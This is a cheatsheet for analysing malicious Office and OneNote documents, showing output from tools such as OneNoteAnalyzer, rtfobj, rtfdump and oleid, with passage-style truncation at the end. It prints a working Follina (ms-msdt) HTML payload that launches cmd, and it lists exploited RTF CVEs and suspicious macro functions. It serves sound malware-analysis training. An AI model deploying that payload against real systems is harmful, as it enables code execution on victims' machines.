full_description = '''Cheatsheet: Malicious Document Analysis Malware Cheatsheet Apr 20, 2024 General What to look for in Maldoc analysis? URLs to download second payload such as fileless commands or executable Commands such as Powershell, Javascript, wscript, etc Filenames such as what it is downloaded and where it been downloaded Embedded file signatures such as PE header with MZ magic bytes Encoded file or commands Lab’s OS Use Windows VM to emulate the maldoc Use REMNUX to analyze the maldoc in depth OneNote Analysis Download the OneNoteAnalyzer from the release page in GitHub. Run OneNoteAnalyzer.exe --file malware.one then it will extract the malicious script from the OneNote file. D:\OneNoteAnalyzer>OneNoteAnalyzer.exe --file "AgreementCancelation_395076(Feb08).one" ________ _______ __ _____ .__ \_____ \ ____ ____ \ \ _____/ |_ ____ / _ \ ____ _____ | | ___.__.________ ___________ / | \ / \_/ __ \ / | \ / _ \ __\/ __ \ / /_\ \ / \\__ \ | |< | |\___ // __ \_ __ \ / | \ | \ ___// | ( <_> ) | \ ___// | \ | \/ __ \| |_\___ | / /\ ___/| | \/ \_______ /___| /\___ >____|__ /\____/|__| \___ >____|__ /___| (____ /____/ ____|/_____ \\___ >__| \/ \/ \/ \/ \/ \/ \/ \/ \/ \/ \/ Author: @knight0x07 [+] OneNote Document Path: AgreementCancelation_395076(Feb08).one [+] OneNote Document File Format: OneNote2010 [+] Extracting Attachments from OneNote Document -> Extracted OneNote Document Attachments: -> Extracted Actual Attachment Path: Z:\build\one | FileName: Open.cmd | Size: 1426 -> OneNote Document Attachments Extraction Path: \AgreementCancelation_395076(Feb08)_content\OneNoteAttachments [+] Extracting Page MetaData from OneNote Document -> Page Count: 1 -> Page MetaData: --------------------------------------------- -> Title: -> Author: admin -> CreationTime: 8/2/2023 8:54:29 AM -> LastModifiedTime: 8/2/2023 2:04:43 PM --------------------------------------------- [+] Extracting Images from OneNote Document -> Extracted OneNote Document Images: -> Extracted Image FileName: 1_?????????? ???????.png | HyperLinkURL: Null -> Extracted Image FileName: 2_?????????? ???????.png | HyperLinkURL: Null -> Image Extraction Path: \AgreementCancelation_395076(Feb08)_content\OneNoteImages [+] Extracting Text from OneNote Document -> Extracted OneNote Document Text: -> Page: | Extraction Path: \AgreementCancelation_395076(Feb08)_content\OneNoteText\1_.txt [+] Extracting HyperLinks from OneNote Document -> Extracted OneNote Document HyperLinks: (Note: Text might contain hyperlink if no overlay) -> Page: -> Text: -> Text: -> HyperLink Extraction Path: \AgreementCancelation_395076(Feb08)_content\OneNoteHyperLinks\onenote_hyperlinks.txt [+] Converting OneNote Document to Image -> Saved Path: \AgreementCancelation_395076(Feb08)_content\ConvertImage_AgreementCancelation_395076(Feb08).png Reviewing the extract files, such as OneNoteAttachments folder… shows the batch file that contains a malicious payload. MS-MSDT scheme aka Follina Exploit A sample shared by nao_sec that abusing ms-msdt to execute code. Refer here. Unzipping the documents, and navigate to maldoc-name\word\_rels\document.xml.rels will reveal the HTML URL which will execute their payload. The payload might looks something like this: <!doctype html> <html lang="en"> <body> <script> window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Start-Process('cmd'))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\""; </script> </body> </html> RTF Exploit RTF often comes with exploits targetting Microsoft Word vulnerabilities. Always look for embedded objects and anomalous content in the RTF. Be prepared to locate, extract and analyze shellcode. Emulate using scdbg OR Execute using jmp2it OR Convert to executable and debug the executable using x32dbg Find the start offset of the shellcode Behavioral analysis RTF exploit list: CVE-2018-8570 CVE-2018-0802 CVE-2017-11882 CVE-2017-0199 CVE-2015-1641 CVE-2014-1761 CVE-2012-0158 rtfobj Use rtfobj to inspect and extract embedded objects from RTF files. remnux@remnux:~/Desktop$ rtfobj malicious.rtf rtfobj 0.55 on Python 3.6.9 - http://decalage.info/python/oletools THIS IS WORK IN PROGRESS - Check updates regularly! Please report any issue at https://github.com/decalage2/oletools/issues =============================================================================== File: 'malicious.rtf' - size: 401748 bytes ---+----------+--------------------------------------------------------------- id |index |OLE Object ---+----------+--------------------------------------------------------------- 0 |0001076Ah |format_id: 2 (Embedded) | |class name: b'Package' | |data size: 159944 | |OLE Package object: | |Filename: '8.t' | |Source path: 'C:\\Aaa\\tmp\\8.t' | |Temp path = 'C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\8.t' | |MD5 = '9bffe424e9b7be9e1461a3218923e110' ---+----------+--------------------------------------------------------------- 1 |0005E98Ah |format_id: 2 (Embedded) | |class name: b'Equation.2\x00\x124Vx\x90\x124VxvT2' | |data size: 6436 | |MD5 = 'a09e82c26f94f3a9297377120503a678' ---+----------+--------------------------------------------------------------- 2 |0005E970h |Not a well-formed OLE object ---+----------+--------------------------------------------------------------- To dump specific OLE Object: remnux@remnux:~/Desktop$ rtfobj malicious.rtf -s 2 rtfobj 0.55 on Python 3.6.9 - http://decalage.info/python/oletools THIS IS WORK IN PROGRESS - Check updates regularly! Please report any issue at https://github.com/decalage2/oletools/issues =============================================================================== File: 'malicious.rtf' - size: 401748 bytes ---+----------+--------------------------------------------------------------- id |index |OLE Object ---+----------+--------------------------------------------------------------- 0 |0001076Ah |format_id: 2 (Embedded) | |class name: b'Package' | |data size: 159944 | |OLE Package object: | |Filename: '8.t' | |Source path: 'C:\\Aaa\\tmp\\8.t' | |Temp path = 'C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\8.t' | |MD5 = '9bffe424e9b7be9e1461a3218923e110' ---+----------+--------------------------------------------------------------- 1 |0005E98Ah |format_id: 2 (Embedded) | |class name: b'Equation.2\x00\x124Vx\x90\x124VxvT2' | |data size: 6436 | |MD5 = 'a09e82c26f94f3a9297377120503a678' ---+----------+--------------------------------------------------------------- 2 |0005E970h |Not a well-formed OLE object ---+----------+--------------------------------------------------------------- Saving raw data in object #0: saving object to file malicious.rtf_object_0005E970.raw md5 a3540560cf9b92c3bc4aa0ed52767b rtfdump.py Alternatively, use rtfdump.py to analyze RTF. Below command list groups and structure of RTF. remnux@remnux:~/Desktop$ rtfdump.py mal.rtf 1 Level 1 c= 124 p=00000000 l= 401423 h= 349186; 319968 b= 0 u= 5079 \rtf1 2 Level 2 c= 115 p=000000b7 l= 8126 h= 950; 20 b= 0 u= 1383 \fonttbl 3 Level 3 c= 1 p=000000c0 l= 82 h= 23; 20 b= 0 u= 11 \f0 4 Level 4 c= 0 p=000000e2 l= 31 h= 20; 20 b= 0 u= 0 \*\panose 5 Level 3 c= 1 p=00000113 l= 72 h= 22; 20 b= 0 u= 4 \f1 <---snip---> 330 Level 2 c= 0 p=0000fab5 l= 3226 h= 3184; 252 b= 0 O u= 0 \*\datastore Name: 'Msxml2.SAXXMLReader.6.0\x00' Size: 1536 md5: 07ea196e1a0674f7ce220b6ae8c61cb7 magic: d0cf11e0 331 Level 2 c= 2 p=00010750 l= 320007 h= 319968; 319968 b= 0 O u= 0 \object Name: 'Package\x00' Size: 159944 md5: 64081623857787fa13f24d59991d76f5 magic: 0200382e 332 Level 3 c= 0 p=0001075f l= 319980 h= 319968; 319968 b= 0 O u= 0 \*\objdata Name: 'Package\x00' Size: 159944 md5: 64081623857787fa13f24d59991d76f5 magic: 0200382e 333 Level 3 c= 0 p=0005e94c l= 10 h= 0; 0 b= 0 u= 0 \result 334 Level 2 c= 1 p=0005e958 l= 14006 h= 13415; 13407 b= 0 u= 1 \object 335 Level 3 c= 1 p=0005e967 l= 13979 h= 13415; 13407 b= 0 u= 0 \objdata 336 Level 4 c= 1 p=0005e97f l= 13954 h= 13407; 13407 b= 0 u= 0 \*\objdata 337 Level 5 c= 0 p=0005e98b l= 534 h= 279; 279 b= 0 u= 0 \ods0000000000000000000000000000000000000000000010034533010342038422221556620832358404453773117665770487510150778730755613138068475808657687162582054482186656468762876881030061344325218221648318281400000000000000000000000000000000000000000000000000000000 338 Remainder c= 0 p=00062010 l= 324 h= 0; 0 b= 0 u= 324 Only NULL bytes = 324 To reduce the output but filtering for the entries that potentially contain the embedded objects, we can use-f O. remnux@remnux:~/Desktop$ rtfdump.py mal.rtf -f O 330 Level 2 c= 0 p=0000fab5 l= 3226 h= 3184; 252 b= 0 O u= 0 \*\datastore Name: 'Msxml2.SAXXMLReader.6.0\x00' Size: 1536 md5: 07ea196e1a0674f7ce220b6ae8c61cb7 magic: d0cf11e0 331 Level 2 c= 2 p=00010750 l= 320007 h= 319968; 319968 b= 0 O u= 0 \object Name: 'Package\x00' Size: 159944 md5: 64081623857787fa13f24d59991d76f5 magic: 0200382e 332 Level 3 c= 0 p=0001075f l= 319980 h= 319968; 319968 b= 0 O u= 0 \*\objdata Name: 'Package\x00' Size: 159944 md5: 64081623857787fa13f24d59991d76f5 magic: 0200382e To dump specific group: rtfdump.py mal.rtf -s 330 -H -d > output.bin If you’re likely encountring RoyalRoad RTF, picture below show Royal Road exploit kit version pattern: Source: An Overhead View of the Royal Road | @nao_sec (nao-sec.org) Also, we can use YARA rules made by NaoSec for RoyalRoad: RoyalRoad YARA rules RTF template injection Search for control word \*\template. Most attacker will serve the RTF template in this control word. For example: CVE 2021 40444 Initial assesment is to check \word\_rels\document.xml.rels DOCX Template injection Reside in word/_rels/settings.xml.rels Macro attack Interesting VBA Functions/Code AutoOpen() AutoExec() AutoClose() Chr() Shell() Private Declare Function WINAPIFUNC Lib DLLNAME oleid Oleid are use to analyze characteristics of the document. remnux@siftworkstation: ~/Work $ oleid baddoc.doc oleid 0.54 - http://decalage.info/oletools THIS IS WORK IN PROGRESS - Check updates regularly! Please report any issue at https://github.com/decalage2/oletools/issues Filename: baddoc.doc Indicator Value OLE format True Has SummaryInformation stream True Application name b'Microsoft Office Word' Encrypted False Word Document True VBA Macros True Excel Workbook False PowerPoint Presentation False Visio Drawing False ObjectPool False Flash objects 0 oletimes Determine the times of modification and creation time of stream in document remnux@siftworkstation: ~/Work $ oletimes baddoc.doc oletimes 0.54 - http://decalage.info/python/oletools THIS IS WORK IN PROGRESS - Check updates regularly! Please report any issue at https://github.com/decalage2/oletools/issues =============================================================================== FILE: baddoc.doc +----------------------------+---------------------+---------------------+ | Stream/Storage name | Modification Time | Creation Time | +----------------------------+---------------------+---------------------+ | Root | 2015-02-10 15:27:52 | None | | '\x01CompObj' | None | None | | '\x05DocumentSummaryInform | None | None | | ation' | | | | '\x05SummaryInformation' | None | None | | '1Table' | None | None | | 'Macros' | 2015-02-10 15:27:52 | 2015-02-10 15:27:52 | | 'Macros/PROJECT' | None | None | | 'Macros/PROJECTwm' | None | None | | 'Macros/UserForm1' | 2015-02-10 15:27:52 | 2015-02-10 15:27:52 | | 'Macros/UserForm1/\x01Comp | None | None | | Obj' | | | | 'Macros/UserForm1/\x03VBFr | None | None | | ame' | | | | 'Macros/UserForm1/f' | None | None | | 'Macros/UserForm1/o' | None | None | | 'Macros/VBA' | 2015-02-10 15:27:52 | 2015-02-10 15:27:52 | | 'Macros/VBA/ThisDocument' | None | None | | 'Macros/VBA/UserForm1' | None | None | | 'Macros/VBA/_VBA_PROJECT' | None | None | | 'Macros/VBA/dir' | None | None | | 'WordDocument' | None | None | +----------------------------+---------------------+---------------------+ oledump Use oledump